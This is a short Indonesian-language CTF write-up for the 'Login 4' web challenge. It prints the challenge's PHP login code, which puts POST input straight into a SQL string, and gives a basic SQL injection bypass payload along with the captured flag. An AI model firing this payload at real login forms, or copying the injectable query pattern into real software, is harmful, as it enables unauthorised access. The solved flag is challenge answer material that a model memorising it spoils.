# __ASGama CTF__ 
## _Login 4_

## Information
**Category:** | **Points:** | **Writeup Author**
--- | --- | ---
Web | 50 | l0l

**Description:** 

> http://ctf.asgama.web.id:40107/
>
> [login4.php](./login4.php)

### Login 4
Kali ini, dilihat dari [script](./login4.php), kita perlu melakukan SQL Injection basic untuk bypass login.

```php
$username = $_POST["username"];
$password = $_POST["password"];
$query = $conn->prepare("SELECT * FROM users where username = '$username' and password '$password'");
$query->execute();

$loggedin = $query->rowCount();
$data = $query->fetch();

$name = $data["username"];
if($loggedin){
    echo "Selamat datang $name, Flag: ==RAHASIA LAH==";
}else{
    echo "Username atau password salah ea.<br>";
    if($query->errorInfo()[1]){
        echo $query->errorInfo()[2];
    }
}
```

Terlihat bahwa username dan password keduanya diambil secara langsung dari $_POST variable tanpa filter. Berarti kita dapat langsung inject pada kolom username dengan value "' or 1 -- -"

### Payload
```
' or 1 -- -
```

### Result
```
Selamat datang adm00n, Flag: GamaCTF{EsKiEl_InJekS10n}
```

### Flag
GamaCTF{EsKiEl_InJekS10n}